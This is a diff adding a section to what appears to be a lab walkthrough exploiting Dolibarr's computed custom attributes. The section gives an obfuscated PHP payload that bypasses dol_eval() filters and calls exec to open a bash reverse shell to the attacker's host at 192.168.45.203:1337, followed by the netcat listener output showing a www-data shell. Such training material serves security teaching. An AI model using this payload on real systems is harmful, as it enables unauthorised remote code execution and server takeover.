@@ -417,3 +417,24 @@ After adding our new payload, we'll click `Save`. Now we can navigate back to th
 The appearance of **`"www-data"`** in the `"test"` column confirms that our payload was successfully processed by `dol_eval()`, bypassing its security filters. This verifies that the application's **custom attribute functionality is vulnerable** and can be exploited to achieve **remote code execution**.
 
 ### Getting a Reverse Shell
+Now that we have a proof-of-concept payload for remote code execution, let's update it to obtain a reverse shell. We already have a framework for calling operating system commands in our payload. We can modify the value we're passing to `exec()` to generate a reverse shell instead of running `whoami`.
+
+Let's use a bash reverse shell:
+```php
+get_defined_functions()['internal'][array_search(urldecode("%65%78%65%63"), get_defined_functions()['internal'])]("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.203/1337 0>&1'");
+```
+Our next steps are to start a `Netcat` listener to handle our reverse shell, then update the Computed field with our new payload.
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 1337
+listening on [any] 1337 ...
+connect to [192.168.45.203] from (UNKNOWN) [192.168.232.141] 51812
+bash: cannot set terminal process group (1629): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@dolibarr:/usr/share/dolibarr/htdocs/user/admin$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@dolibarr:/usr/share/dolibarr/htdocs/user/admin$ 
+
+```
+Excellent. Our payload worked and we now have a reverse shell on the Dolibarr VM.
